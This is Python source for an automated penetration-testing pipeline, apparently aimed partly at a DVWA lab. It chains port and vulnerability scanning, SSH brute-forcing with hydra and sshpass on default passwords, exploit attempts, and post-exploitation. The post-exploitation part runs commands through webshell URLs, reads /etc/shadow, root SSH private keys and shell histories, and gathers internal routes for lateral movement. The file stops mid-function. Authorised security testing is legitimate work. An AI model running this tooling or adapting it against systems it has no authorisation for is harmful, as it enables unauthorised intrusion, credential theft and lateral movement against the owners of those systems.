def _dedup_findings(findings):
    """按 title 去重"""
    seen = set()
    out = []
    for f in findings:
        t = f.get("title", "")
        if t not in seen:
            seen.add(t)
            out.append(f)
    return out


# ═══════════════════════════════════════════════════════════
#  原子动作处理器 — 每个动作调用现有的 _phase_ 函数
# ═══════════════════════════════════════════════════════════

def _action_port_scan(task_id, target, params, state):
    result = _phase_port_scan(target, [], "quick")
    ports = result.get("ports", [])
    return {"ports": ports, "findings": [], "summary": f"Found {len(ports)} ports"}

def _action_full_port_scan(task_id, target, params, state):
    result = _phase_port_scan(target, [], "full")
    ports = result.get("ports", [])
    return {"ports": ports, "findings": [], "summary": f"Found {len(ports)} ports"}

def _action_service_detect(task_id, target, params, state):
    ports_to_scan = params.get("ports", state["ports"]) if isinstance(params, dict) else state["ports"]
    result = _phase_service_detect(target, ports_to_scan)
    services = result.get("services", [])
    return {"services": services, "findings": [], "summary": f"Identified {len(services)} services"}

def _action_vuln_scan(task_id, target, params, state):
    scan_type = params.get("depth", "standard") if isinstance(params, dict) else "standard"
    result = _phase_nuclei_scan(target, scan_type)
    findings = result.get("findings", [])
    web_ports = [p for p in state["ports"] if p in (80, 443, 8080, 8443, 3000, 5000, 8000, 9000)]
    if web_ports:
        try:
            nikto_r = _phase_nikto_scan(target, web_ports)
            for f in nikto_r.get("findings", []):
                if f not in findings:
                    findings.append(f)
        except Exception:
            pass
    return {"findings": findings, "summary": f"Found {len(findings)} vulnerabilities"}

def _action_dir_bruteforce(task_id, target, params, state):
    url = params.get("url", target) if isinstance(params, dict) else target
    # [Fix 5] DVWA vulnerability 路径探测
    dvwa_paths = [
        "vulnerabilities/", "vulnerabilities/sqli/", "vulnerabilities/sqli_blind/",
        "vulnerabilities/exec/", "vulnerabilities/upload/", "vulnerabilities/xss_r/",
        "vulnerabilities/xss_s/", "vulnerabilities/xss_d/", "vulnerabilities/csrf/",
        "vulnerabilities/fi/", "vulnerabilities/captcha/", "vulnerabilities/authbypass/",
        "vulnerabilities/brute/", "vulnerabilities/weak_id/", "vulnerabilities/api/",
        "vulnerabilities/bac/", "vulnerabilities/open_redirect/", "vulnerabilities/csp/",
        "vulnerabilities/javascript/",
    ]
    if isinstance(params, dict):
        extra = params.get("extra_paths", [])
        for p in dvwa_paths:
            if p not in extra:
                extra.append(p)
        params["extra_paths"] = extra
    result = _phase_directory_scan(url, state["ports"])
    findings = result.get("findings", [])
    return {"findings": findings, "summary": f"Found {len(findings)} dirs"}

def _action_web_tech(task_id, target, params, state):
    result = _phase_whatweb(target, state["ports"])
    services = result.get("services", [])
    return {"services": services, "findings": [], "summary": f"Identified web tech"}

def _action_nikto_scan(task_id, target, params, state):
    url = params.get("url", target) if isinstance(params, dict) else target
    result = _phase_nikto_scan(url, state["ports"])
    findings = result.get("findings", [])
    return {"findings": findings, "summary": f"Found {len(findings)} issues"}

def _action_credential_test(task_id, target, params, state):
    host = _strip_url(target)
    result = _phase_auth_test(host)
    findings = result.get("findings", [])
    # Extract structured credentials from findings
    credentials = []
    for f in findings:
        title = f.get("title", "")
        if "Auth bypass:" in title:
            # Parse: "Auth bypass: http://host:port/path with user:pass (HTTP 200)"
            try:
                parts = title.split(" with ")
                if len(parts) >= 2:
                    cred_part = parts[1].split(" (")[0]
                    user, pwd = cred_part.split(":", 1)
                    url_part = parts[0].replace("Auth bypass: ", "")
                    svc = "http"
                    if ":8080" in url_part:
                        svc = "http-8080"
                    elif ":80" in url_part:
                        svc = "http-80"
                    elif ":443" in url_part:
                        svc = "https"
                    credentials.append({"service": svc, "username": user, "password": pwd, "url": url_part})
            except:
                pass
    
    # Also try SSH hydra for any SSH ports in state
    ports = state.get("ports", [])
    services = state.get("services", {})
    for p in ports:
        svc_info = services.get(str(p), {})
        svc_name = svc_info.get("name", "").lower() if isinstance(svc_info, dict) else ""
        if svc_name == "ssh" or p in (22, 2222):
            # Test common SSH passwords via hydra
            rc, out, _ = _execute_in_sandbox(
                f"hydra -l root -P /usr/share/wordlists/rockyou.txt.gz -s {p} -t 4 -w 5 {host} ssh 2>/dev/null | grep -i 'login:\|password:' | head -5 || true",
                timeout=60
            )
            if rc == 0 and out:
                for line in out.strip().split('\n'):
                    if 'login:' in line.lower() and 'password:' in line.lower():
                        try:
                            user = line.split('login:')[1].split()[0].strip()
                            pwd = line.split('password:')[1].split()[0].strip()
                            credentials.append({"service": "ssh", "port": p, "username": user, "password": pwd})
                        except:
                            pass
            
            # Also try with direct sshpass for common passwords
            for pw in ["root", "admin", "password", "123456", "toor"]:
                rc2, out2, _ = _execute_in_sandbox(
                    f"sshpass -p '{pw}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 {host} -p {p} 'id' 2>/dev/null",
                    timeout=10
                )
                if rc2 == 0 and out2:
                    found_user = "root"
                    if "uid=" in out2:
                        import re
                        m = re.search(r'uid=(\d+)\((\w+)\)', out2)
                        if m:
                            found_user = m.group(2)
                    credentials.append({"service": "ssh", "port": p, "username": found_user, "password": pw})
                    break
    
    return {"findings": findings, "credentials": credentials, "summary": f"Cred test: {len(findings)} findings, {len(credentials)} creds"}

def _action_sql_injection(task_id, target, params, state):
    url = params.get("url", "") if isinstance(params, dict) else ""
    if not url:
        return {"findings": [], "summary": "No URL"}
    from tasks.scan_tasks import _exec_tool
    r = _exec_tool("/go/bin/nuclei", ["-u", url, "-tags", "sql-injection", "-json", "-silent"], timeout=120)
    findings = []
    if r.stdout:
        for line in r.stdout.strip().split("\n"):
            if line.strip():
                try:
                    d = json.loads(line)
                    findings.append({"title": d.get("info",{}).get("name","SQLi"), "severity": d.get("info",{}).get("severity","high"), "tool_source": "nuclei-sqli"})
                except:
                    pass
    return {"findings": findings, "summary": f"{len(findings)} vectors"}

def _action_auth_bypass(task_id, target, params, state):
    url = params.get("url", target) if isinstance(params, dict) else target
    result = _phase_auth_test(url)
    findings = result.get("findings", [])
    return {"findings": findings, "summary": f"Bypass: {len(findings)}"}

def _action_web_fuzz(task_id, target, params, state):
    url = params.get("url", target) if isinstance(params, dict) else target
    result = _phase_web_fuzz(url, state["ports"])
    findings = result.get("findings", [])
    return {"findings": findings, "summary": f"Fuzz: {len(findings)}"}

def _action_api_scan(task_id, target, params, state):
    url = params.get("url", target) if isinstance(params, dict) else target
    result = _phase_api_scan(url)
    findings = result.get("findings", [])
    return {"findings": findings, "summary": f"API: {len(findings)}"}

def _action_smb_enum(task_id, target, params, state):
    result = _phase_krb_scan(target)
    findings = result.get("findings", [])
    result2 = _phase_ad_enum(target)
    for f in result2.get("findings", []):
        if f not in findings:
            findings.append(f)
    return {"findings": findings, "summary": f"SMB: {len(findings)}"}

def _action_lateral_probe(task_id, target, params, state):
    subnet = params.get("subnet", "192.168.1.0/24") if isinstance(params, dict) else "192.168.1.0/24"
    result = _phase_asset_discovery(subnet)
    hosts = result.get("hosts", [])
    return {"findings": [], "hosts": hosts, "summary": f"Found {len(hosts)} hosts"}

#  各阶段执行函数

# ═══════════════════════════════════════════════════════════



def _phase_asset_discovery(target: str) -> dict:

    """资产发现：存活探测 + 快速端口扫描"""

    # 如果是 IP 段，用 nmap -sn 做存活探测

    is_range = "/" in target or "-" in target

    discovered = [target]

    if is_range:

        try:

            r = _exec_tool("/usr/bin/nmap", ["-sn", "-T4", "-oG", "-", _strip_url(target)], timeout=120)

            output = r.stdout or ""

            discovered = []

            for line in output.split("\n"):

                if "Up" in line and "Host:" in line:

                    ip = line.split("Host: ")[1].split(" ")[0]

                    discovered.append(ip)

        except Exception:

            pass



    return {

        "hosts": discovered,

        "ports": [],

        "services": [],

        "summary": f"Discovered {len(discovered)} live hosts",

    }






# ═══════════════════════════════════════════════════════════
#  利用引擎动作 — exploit / post_exploit
# ═══════════════════════════════════════════════════════════

def _action_exploit(task_id, target, params, state):
    """漏洞利用 — 尝试扫描发现的漏洞建立会话"""
    from app.exploit_engine import ExploitExecutor
    executor = ExploitExecutor(task_id=task_id)
    host = _strip_url(target)

    # 从 state 获取发现
    findings = state.get("findings", []) or []
    raw_services = state.get("services", []) or []
    # services may be a dict (keyed by port) or a list
    if isinstance(raw_services, dict):
        services = list(raw_services.values())
    else:
        services = raw_services

    # 提取 payload 参数
    payload_params = params.get("payload", {})
    if isinstance(payload_params, str):
        try:
            import json
            payload_params = json.loads(payload_params)
        except: pass

    _publish(task_id, "phase_start", {"action": "exploit", "target": host})

    results = {"exploit_attempts": [], "sessions_created": [], "success": False}

    # 尝试利用发现的漏洞
    if findings:
        batch = executor.batch_exploit(findings)
        results.update(batch)
        results["success"] = batch.get("successful", 0) > 0
        results["sessions_created"] = batch.get("sessions", [])
        results["exploit_attempts"] = batch.get("errors", [])

    # 从 state 获取凭据传给 exploit executor
    creds_from_state = state.get("credentials", []) or []
    vuln_context = {}
    if creds_from_state:
        vuln_context["credentials"] = creds_from_state
    # always 尝试 services 路线（不跳过 HTTP/Web 等）
    import logging as _lg
    _lg.getLogger("exploit_debug").info("[EXPLOIT_DEBUG] services loop starting, len=%d" % len(services))
    for _i,_s in enumerate(services[:5]):
        _lg.getLogger("exploit_debug").info("[EXPLOIT_DEBUG] svc[%d]: name='%s' port=%s" % (_i, _s.get("name","?"), _s.get("port","?")))
    for svc in services[:5]:
        svc_name = svc.get("name", "") or svc.get("service", "")
        svc_port = int(svc.get("port", 0))
        svc_version = svc.get("version", "")
        if svc_name or svc_port:
            r = executor.attempt(host, svc_name, svc_version, svc_port, vuln_info=vuln_context)
            results["exploit_attempts"].append({
                "service": svc_name,
                "port": svc_port,
                "result": r.get("success", False),
                "session_id": r.get("session_id", ""),
                "error": r.get("error", ""),
            })
            if r.get("success"):
                # Extract individual sessions from the result
                if r.get("session_id"):
                    results["sessions_created"].append(r)
                elif r.get("sessions"):
                    for sess in r["sessions"]:
                        if isinstance(sess, dict):
                            results["sessions_created"].append(sess)
                        else:
                            results["sessions_created"].append({"session_id": str(sess)})
                else:
                    results["sessions_created"].append(r)
                results["success"] = True
    session_count = len(results.get("sessions_created", []))
    results["findings_count"] = session_count
    return results


def _action_post_exploit(task_id, target, params, state):
    """后渗透操作 — 在已有会话上执行"""
    from app.exploit_engine import SessionManager, ADAttackKit
    host = _strip_url(target)
    _publish(task_id, "phase_start", {"action": "post_exploit", "target": host})

    sm = SessionManager()
    sessions = sm.list(target=host)
    ad = ADAttackKit()
    ad_target = None  # will be set if AD context found

    results = {"operations": [], "findings": [], "summary": ""}

    # 1. 信息收集（支持 SSH/HTTP WebShell 会话）
    info = {"hostname": "", "os": "", "users": [], "processes": []}
    for sess in sessions:
        sid = sess.get("id", "")
        sess_type = sess.get("session_type", "")
        meta = sess.get("metadata", {})

        # HTTP WebShell 会话 → 用 curl 执行命令
        if sess_type == "http" or meta.get("type") in ("php_webshell", "command_injection"):
            ws_url = meta.get("webshell_url", "")
            ws_pass = meta.get("pass", "c")
            if ws_url:
                import subprocess as _sp
                for cmd in ["hostname", "cat /etc/os-release 2>/dev/null | head -3", "who -a 2>/dev/null | head -10", "uname -a"]:
                    cmd_url = f"{ws_url}?{ws_pass}={_sp.quote(cmd)}"
                    try:
                        r = _sp.run(f"docker exec yunjing-sbx curl -s --connect-timeout 5 '{cmd_url}' 2>/dev/null",
                                    shell=True, timeout=15, capture_output=True, text=True)
                        if r.stdout.strip():
                            info["raw_output"] = (info.get("raw_output", "") + "\n--- " + cmd + " ---\n" + r.stdout.strip()[:500])
                            results["info_gathered"] = True
                    except:
                        pass
        else:
            # Standard SSH/SMB session
            r = sm.execute(sid, "hostname; cat /etc/os-release 2>/dev/null | head -3; who -a 2>/dev/null | head -10")
            if r.get("success"):
                info["raw_output"] = r.get("stdout", "")[:2000]
            results["info_gathered"] = True

    # 2. 凭据收集（Linux）
    cred_files = [
        "/etc/shadow", "/etc/passwd",
        "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
        "/var/log/auth.log*",
        "~/.bash_history", "~/.mysql_history",
    ]
    found_creds = []
    for sess in sessions:
        sid = sess.get("id", "")
        for cf in cred_files:
            r = sm.execute(sid, f"cat {cf} 2>/dev/null | head -20")
            if r.get("success") and r.get("stdout", "").strip():
                found_creds.append({"file": cf, "content_preview": r["stdout"][:200]})
                results["findings"].append({"title": f"凭据文件: {cf}", "severity": "high"})

    # 3. AD 域操作（如果会话在域内）
    for sess in sessions:
        domain = sess.get("domain", "")
        if domain and ad:
            # BloodHound 收集
            try:
                ad_t = ad.__class__.__init__.__defaults__  # placeholder
            except: pass

    # 4. 横向移动 — 收集内网 ARP/路由
    routes = []
    for sess in sessions:
        sid = sess.get("id", "")
        r = sm.execute(sid, "ip route 2>/dev/null || route print 2>/dev/null")
        if r.get("success"):
            routes.append(r.get("stdout", "")[:500])
            results["findings"].append({"title": "内网路由信息", "severity": "info", "data": r["stdout"][:200]})

    results["operations"] = [
        {"name": "info_collect", "success": bool(info.get("raw_output"))},
        {"name": "credential_harvest", "success": len(found_creds) > 0, "count": len(found_creds)},
        {"name": "route_discovery", "success": len(routes) > 0},
    ]
    results["summary"] = f"后渗透完成: {sum(1 for op in results['operations'] if op.get('success'))}/{len(results['operations'])} 项成功"
    results["findings_count"] = len(results["findings"])
    results["sessions_used"] = len(sessions)
    return results

def _phase_port_scan(target: str, existing_ports: list, scan_type: str) -> dict:

    """端口扫描：基于扫描类型和已有结果"""

    if existing_ports:

        return {"ports": existing_ports, "summary": f"Using {len(existing_ports)} existing ports"}



    if scan_type == "quick":

        ports = "80,443,22,21,2222,8080,8443,3000,5000,8000,9000,9090,3306,5432,6379,27017,3389,1433,1521,13577"

    elif scan_type == "full":

        ports = "1-65535"

    elif scan_type == "web":

        ports = "80,443,8080,8443,3000,5000,8000,9000,9090"

    else:

        ports = "80,443,22,21,8080,8443,3306,5432,6379,27017,3389,1433,1521,13577"



    r = _exec_tool("/usr/bin/nmap", ["-T4", "--open", "-oG", "-", "-p", ports, _strip_url(target)], timeout=600)

    output = r.stdout or r.stderr or ""



    found = []

    for line in output.split("\n"):

        if "/open/" in line:

            for part in line.strip().split():

                if "/open/" in part:

                    try:

                        found.append(int(part.split("/")[0]))

                    except Exception:

                        pass



    return {"ports": sorted(set(found)), "summary": f"Found {len(found)} open ports"}





def _phase_service_detect(target: str, ports: list[int]) -> dict:

    """服务/版本识别"""

    if not ports:

        return {"services": [], "summary": "No ports to scan"}

    port_str = ",".join(str(p) for p in ports[:20])

    r = _exec_tool("/usr/bin/nmap", ["-sV", "-T4", "-p", port_str, _strip_url(target)], timeout=180)

    services = []

    output = r.stdout or ""

    for line in output.split("\n"):

        if "/tcp" in line and "open" in line:

            parts = line.strip().split()

            if len(parts) >= 4:

                port = parts[0].split("/")[0]

                service = parts[2]

                version = " ".join(parts[3:5]) if len(parts) > 3 else ""

                services.append({"port": int(port), "service": service, "version": version})

    return {"services": services, "summary": f"Identified {len(services)} services"}





def _phase_nuclei_scan(target: str, scan_type: str) -> dict:

    """Nuclei 漏洞扫描"""

    severity = "medium,high,critical"

    if scan_type == "quick":

        severity = "high,critical"



    r = _exec_tool("/go/bin/nuclei", ["-u", target, "-severity", severity,

                                       "-j", "-silent", "-retries", "2",

                                       "-t", "/data/nuclei-templates/",

                                       "-timeout", "10"], timeout=600)

    output = r.stdout or ""

    findings = []

    for line in output.strip().split("\n"):

        line = line.strip()

        if not line:

            continue

        try:

            data = json.loads(line)

            info = data.get("info", {})

            classification = info.get("classification", {}) or {}

            cve_list = classification.get("cve-id")

            if isinstance(cve_list, list):

                cve_id = cve_list[0] if cve_list else None

            else:

                cve_id = cve_list

            f = {

                "title": info.get("name", data.get("template-id", "Unknown")),

                "severity": info.get("severity", "info"),

                "cve_id": cve_id,

                "cvss_score": classification.get("cvss-score"),

                "description": info.get("description", ""),

                "evidence": data.get("matched-at", ""),

                "remediation": info.get("remediation", ""),

                "references": info.get("reference", []),

                "tool_source": "nuclei",

                "confidence": 0.8,

            }

            findings.append(f)

        except (json.JSONDecodeError, KeyError):

            continue

    return {"findings": findings}





def _phase_nikto_scan(target: str, web_ports: list = None) -> dict:

    """Nikto Web 漏洞扫描"""

    url = target if target.startswith("http") else f"http://{target}"

    try:

        r = _exec_tool("/usr/bin/nikto", ["-h", url, "-nointeractive",

                                           "-Tuning", "123456"], timeout=600)

        output = r.stdout or r.stderr or ""

    except subprocess.TimeoutExpired:

        output = "[NIKTO_TIMEOUT] Scan exceeded 600s timeout"

    except Exception as e:

        output = f"[NIKTO_ERROR] {e}"

    output = output or ""

    findings = []

    for line in output.split("\n"):

        if "+ " in line:

            msg = line.split("+ ", 1)[-1].strip()

            findings.append({

                "title": msg[:200], "severity": "medium",

                "tool_source": "nikto", "confidence": 0.5,

                "description": msg[:500],

            })

    return {"findings": findings}





def _phase_whatweb(target: str, ports: list) -> dict:

    """WhatWeb 技术栈识别"""

    web_ports = [p for p in ports if p in (80, 443, 8080, 8443, 3000, 5000, 8000, 9000, 13577)]

    techs = []

    for port in web_ports[:3]:

        scheme = "https" if port in (443, 8443) else "http"

        url = f"{scheme}://{_strip_url(target)}:{port}"

        try:

            r = _exec_tool("/usr/bin/whatweb", ["--log-json=/dev/stdout", url], timeout=30)

            for line in (r.stdout or "").split("\n"):

                if target in line:

                    techs.append({"url": url, "info": line[:200]})

        except Exception:

            pass

    return {"techs": techs, "summary": f"Analyzed {len(techs)} web services"}





def _phase_directory_scan(target: str, web_ports: list = None) -> dict:

    """目录扫描 — gobuster + dirsearch 双引擎"""

    findings = []

    seen = set()

    wordlist = "/usr/share/wordlists/dirb/common.txt"

    web_found = [p for p in (web_ports or [80]) if p in (80,443,8080,8443,3000,5000,8000,9000,9090)] or [80]

    _host = _strip_url(target)

    urls = []

    for port in web_found[:4]:

        scheme = "https" if port in (443, 8443) else "http"

        urls.append(f"{scheme}://{_host}:{port}")

    if not urls:

        urls = [f"http://{_host}", f"https://{_host}"]

    for url in urls:

        # Gobuster

        try:

            r = _exec_tool("/go/bin/gobuster", ["dir", "-u", url, "-w", wordlist,

                                                 "-t", "20", "-s", "200,301,302,307,401,403",

                                                 "-q", "-n", "-o", "/dev/stdout"], timeout=120)

            for line in (r.stdout or "").split(chr(10)):

                if line.strip() and (line[0].isdigit() or "/" in line):

                    parts = line.split()

                    path = parts[-1] if len(parts) > 2 else parts[0]

                    status = parts[0] if parts[0].isdigit() else "200"

                    key = f"{url}{path}_{status}"

                    if key not in seen:

                        seen.add(key)

                        findings.append({"title": f"Dir: {url}{path} (HTTP {status})", "severity": "info", "tool_source": "gobuster"})

        except: pass

        # Dirsearch supplement

        try:

            r2 = _exec_tool("/usr/local/bin/dirsearch", ["-u", url, "-w", wordlist, "-t", "10",

                                                          "--random-agent", "--timeout=5", "-q",

                                                          "-o", "/dev/stdout"], timeout=120)

            for line in (r2.stdout or "").split(chr(10)):

                if "[" in line and "]" in line:

                    for word in line.split():

                        if word.startswith("http") and word not in seen:

                            seen.add(word)

                            findings.append({"title": f"Dir: {word}", "severity": "info", "tool_source": "dirsearch"})

        except: pass

    return {"findings": findings}





def _dedup_findings(findings: list[dict]) -> list[dict]:

    seen = set()

    result = []

    for f in sorted(findings, key=lambda x: -_severity_score(x.get("severity", "info"))):

        key = f.get("title", "").lower()[:100]

        if key and key not in seen:

            seen.add(key)

            result.append(f)

    return result





def _log_phase(log: list, name: str, status: str, data: any = None):

    entry = {"name": name, "status": status}

    if data:

        entry["data"] = data

    log.append(entry)





# ═══════════════════════════════════════════════════════════

#  报告生成 (占位 → Phase 3 完善)

# ═══════════════════════════════════════════════════════════



@app.task(bind=True)

def generate_report(self, task_id):

    return {"status": "pending", "task_id": task_id}





@app.task(bind=True, max_retries=2)




@app.task(bind=True, max_retries=3)
def execute_round_2(self, task_id: str, target: str, instruction: str,
                    previous_report: dict = None) -> dict:
    """第二轮渗透 — 根据用户指令定向执行"""
    from datetime import datetime
    from sqlalchemy import create_engine, text as sa_text
    from tasks.scan_tasks import _engine, _execute_decision_action, _update_scan_state, _publish, logger
    
    start_time = datetime.utcnow()
    
    try:
        import sys
        if '/app' not in sys.path: sys.path.insert(0, '/app')
        from tasks.round_manager import parse_instruction, execute_round_2 as _execute_r2
        
        # Init state
        host = target.split(":")[0].split("/")[-1]
        state = {
            "host": host, "ports": [], "services": {}, "vulnerabilities": [],
            "credentials": [], "actions_taken": [], "findings_count": 0,
            "sessions": previous_report.get("sessions", []) if previous_report else [],
        }
        
        db = _engine.connect() if hasattr(_engine, 'url') else None
        
        _publish(task_id, "round2_started", {"instruction": instruction})
        
        result = _execute_r2(
            task_id=task_id, target=target, instruction=instruction,
            previous_report=previous_report or {},
            state=state, start_time=start_time,
            db=db, _engine=_engine, _publish=_publish,
            execute_action_func=_execute_decision_action,
            _update_state_func=_update_scan_state,
        )
        
        # Update DB — MERGE with existing result
        try:
            if db:
                from sqlalchemy import select as sa_select
                existing = db.execute(sa_select(sa_text("*")).select_from(sa_text("scan_tasks")).where(sa_text("id = :id")), {"id": task_id}).fetchone()
                existing_result = existing[0] if existing else {}
                if isinstance(existing_result, str):
                    import json as _j2
                    try:
                        existing_result = _j2.loads(existing_result)
                    except:
                        existing_result = {}
                if isinstance(existing_result, dict) and "round" in existing_result:
                    existing_result["round2"] = result
                    merged = existing_result
                else:
                    merged = {"round1": existing_result, "round2": result}
                db.execute(sa_text("UPDATE scan_tasks SET result=:r, "
                    "updated_at=:now WHERE id=:id"),
                    {"r": json.dumps(merged), "now": datetime.utcnow(), "id": task_id})
                db.commit()
        except Exception as merge_err:
            logger.warning("[Round 2] DB merge failed: %s", merge_err)
        
        _publish(task_id, "round2_complete", {"instruction": instruction, "result": result})
        return result
        
    except Exception as e:
        logger.exception("[Round 2] 执行失败: %s", e)
        return {"status": "failed", "error": str(e)[:500],
                "elapsed": (datetime.utcnow() - start_time).total_seconds()}


@app.task(bind=True, max_retries=2)
def generate_final_report(self, task_id: str, target: str) -> dict:
    """生成最终渗透测试报告"""
    import json
    from datetime import datetime
    from sqlalchemy import create_engine, text as sa_text
    from tasks.scan_tasks import _engine, logger
    
    logger.info("[FinalReport] 开始生成最终报告: task_id=%s target=%s", task_id, target)
    
    try:
        db = _engine.connect()
        
        # Read current task data
        row = db.execute(sa_text("SELECT result FROM scan_tasks WHERE id=:id"),
                        {"id": task_id}).fetchone()
        report_data = {}
        if row and row[0]:
            try:
                report_data = json.loads(row[0]) if isinstance(row[0], str) else row[0]
            except:
                report_data = {}
        
        # Build structured report
        report = {
            "task_id": task_id,
            "target": target,
            "title": f"渗透测试报告 - {target}",
            "generated_at": str(datetime.utcnow()),
            "summary": {
                "total_findings": report_data.get("findings_count", 0),
                "total_sessions": len(report_data.get("sessions", [])),
                "attack_chain": report_data.get("attack_chain", {}).get("summary", ""),
                "duration": f"{report_data.get('duration_seconds', 0)}s",
            },
            "attack_chain": report_data.get("attack_chain", {}),
            "sessions": report_data.get("sessions", []),
            "suggestions": report_data.get("suggestions", []),
            "coverage": report_data.get("coverage", {}),
        }
        
        # Save report
        db.execute(sa_text("UPDATE scan_tasks SET "
            "result=:r, updated_at=:now WHERE id=:id"),
            {"r": json.dumps({**report_data, "final_report": report}),
             "now": datetime.utcnow(), "id": task_id})
        db.commit()
        
        logger.info("[FinalReport] 报告生成完成")
        return {"status": "completed", "report": report}
    
    except Exception as e:
        logger.exception("[FinalReport] 生成失败: %s", e)
        return {"status": "failed", "error": str(e)[:500]}


def execute_single_phase(self, target, phase_name, context=None):

    context = context or {}

    existing_ports = context.get("ports", [])

    _publish("phase-" + phase_name, "phase", {"phase": phase_name, "status": "running"})

    try:

        result_data = {}

        if phase_name == "asset_discovery":

            data = _phase_asset_discovery(target)

            result_data = {"alive": data.get("alive", False), "ports": data.get("ports", [])}

        elif phase_name == "port_scan":

            data = _phase_port_scan(target, existing_ports, "full")

            result_data = {"ports": data.get("ports", []), "port_count": len(data.get("ports", []))}

        elif phase_name == "service_detect":

            ports = existing_ports or []

            data = _phase_service_detect(target, ports) if ports else {"services": []}

            result_data = {"services": data.get("services", []), "details": data.get("details", [])}

        elif phase_name == "vuln_scan":

            data = _phase_nuclei_scan(target, "full")

            findings = data.get("results", [])

            result_data = {"findings": findings, "critical": sum(1 for f in findings if f.get("severity","").lower()=="critical"), "high": sum(1 for f in findings if f.get("severity","").lower()=="high"), "medium": sum(1 for f in findings if f.get("severity","").lower()=="medium"), "low": sum(1 for f in findings if f.get("severity","").lower()=="low")}

        elif phase_name == "web_scan":

            data = _phase_nikto_scan(target)

            result_data = {"web_findings": data.get("results", [])}

        elif phase_name == "web_fingerprint":

            ports = existing_ports or []

            data = _phase_whatweb(target, ports)

            result_data = {"tech_stack": data.get("results", [])}

        elif phase_name == "dir_scan":

            data = _phase_directory_scan(target)

            result_data = {"directories": data.get("results", [])}

        elif phase_name == "osint_gather":

            data = _phase_osint_gather(target)

            result_data = {"subdomains": data.get("subdomains", []), "dns_records": data.get("dns_records", {})}

        elif phase_name == "exploitation":

            services = context.get("services", [])

            findings = context.get("findings", [])

            data = _phase_exploitation(target, services, findings)

            result_data = {"exploits_found": data.get("exploits_found", []), "success": data.get("success", False)}

        elif phase_name == "post_exploit":

            ports = context.get("ports", [])

            data = _phase_post_exploit(target, ports)

            result_data = {"lateral_targets": data.get("lateral_targets", []), "credential_checks": data.get("credential_checks", []), "priv_esc_vectors": data.get("priv_esc_vectors", [])}

        elif phase_name == "threat_model":

            ports = context.get("ports", [])

            services = context.get("services", [])

            findings = context.get("findings", [])

            data = _phase_threat_model(target, ports, services, findings)

            result_data = {"profile": data.get("profile", ""), "attack_surface": data.get("attack_surface", {}), "suggested_attack_path": data.get("suggested_attack_path", ""), "recommendation": data.get("recommendation", "")}

        else:

            return {"phase": phase_name, "status": "failed", "error": "Unknown phase: " + phase_name}

        _publish("phase-" + phase_name, "phase", {"phase": phase_name, "status": "done", "data": {k: len(v) if isinstance(v, list) else v for k, v in result_data.items()}})

        return {"phase": phase_name, "status": "done", "data": result_data}

    except Exception as e:

        _publish("phase-" + phase_name, "phase", {"phase": phase_name, "status": "failed", "data": {"error": str(e)}})

        return {"phase": phase_name, "status": "failed", "error": str(e)}





def _execute_in_sandbox(cmd: str, timeout: int = 30):

    """Execute shell command inside Kali sandbox container via docker exec"""

    import os

    import subprocess as _sp

    try:

        full_cmd = ["docker", "exec", "-e", f"PATH={SANDBOX_ENV}", SANDBOX_NAME,

                    "bash", "-c", cmd]

        r = _sp.run(full_cmd, capture_output=True, text=True, timeout=timeout)

        return r.returncode, r.stdout, r.stderr

    except Exception as e:

        return -1, "", str(e)





def _phase_osint_gather(target):

    _host = _strip_url(target)

    """Real OSINT: subfinder + DNS + whatweb + httpx"""

    import json

    results = {"subdomains": [], "dns_records": {}, "technologies": [], "live_hosts": [], "screenshot_urls": []}

    # Subfinder

    rc, out, _ = _execute_in_sandbox(f"subfinder -d {_host} -silent -timeout 15 2>/dev/null || true", 30)

    if rc == 0 and out:

        results["subdomains"] = [d.strip() for d in out.split(chr(10)) if d.strip() and not d.startswith("_") and len(d.strip()) > 2][:50]

    # DNS records

    for rec in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:

        rc2, out2, _ = _execute_in_sandbox(f"dig +short {rec} {_host} 2>/dev/null || true", 15)

        if rc2 == 0 and out2.strip():

            results["dns_records"][rec] = [r.strip() for r in out2.split(chr(10)) if r.strip()]

    # Whatweb tech detection

    rc3, out3, _ = _execute_in_sandbox(f"whatweb -a 1 {_host} --log-json=/dev/stdout 2>/dev/null || echo '[]'", 30)

    if rc3 == 0 and out3.strip():

        try:

            ww = json.loads(out3)

            if isinstance(ww, list) and ww:

                results["technologies"] = list(ww[0].get("plugins", {}).keys())[:20]

        except: pass

    # Httpx probe

    rc4, out4, _ = _execute_in_sandbox(f"httpx -silent -timeout 5 -status-code -title -follow-redirects -u {_host} 2>/dev/null || true", 15)

    if rc4 == 0 and out4.strip():

        results["live_hosts"] = [l.strip() for l in out4.split(chr(10)) if l.strip()][:10]

    return results





def _phase_exploitation(target, services=None, findings=None):

    _host = _strip_url(target)

    """Real exploitation: searchsploit + hydra brute-force + sqlmap + msfconsole"""

    import json

    results = {"exploits_found": [], "exploits_attempted": [], "success": False, "compromised": False, "findings": []}

    services = services or []

    findings = findings or []



    # 1. searchsploit — search for known exploits

    terms = set()

    for svc in services:

        n, v = svc.get("name", ""), svc.get("version", "")

        if n: terms.add(f"{n} {v}".strip())

    for f in findings:

        t = f.get("title", f.get("name", ""))

        if t: terms.add(t[:30])

    for term in list(terms)[:8]:

        if not term or len(term) < 3: continue

        rc, out, _ = _execute_in_sandbox(f"searchsploit --json {term} 2>/dev/null || echo '{{}}'", 60)

        if rc == 0 and out:

            try:

                for e in json.loads(out).get("RESULTS_EXPLOIT", [])[:5]:

                    results["exploits_found"].append({"title": str(e.get("Title",""))[:150], "path": e.get("Path",""), "type": e.get("Type",""), "platform": e.get("Platform","")})

            except: pass



    # 2. hydra brute force (SSH)

    for svc in services:

        name = svc.get("name", "").lower()

        port = int(svc.get("port", 0))

        if name in ("ssh","openssh") or port == 22:

            rc, out, _ = _execute_in_sandbox(f"hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -w 10 {_host} ssh 2>/dev/null || echo 'timeout'", 120)

            if rc == 0 and "password:" in out.lower():

                for line in out.split(chr(10)):

                    if "password:" in line.lower():

                        results["exploits_attempted"].append({"type":"hydra_ssh","port":22,"success":True,"credential":line.strip()[:80]})

                        results["compromised"] = True

                        results["findings"].append({"title":f"SSH Weak Password: {line.strip()[:80]}","severity":"critical","tool_source":"hydra"})

                        break

            else:

                results["exploits_attempted"].append({"type":"hydra_ssh","port":22,"success":False})

        # FTP brute force

        if name in ("ftp",) or port == 21:

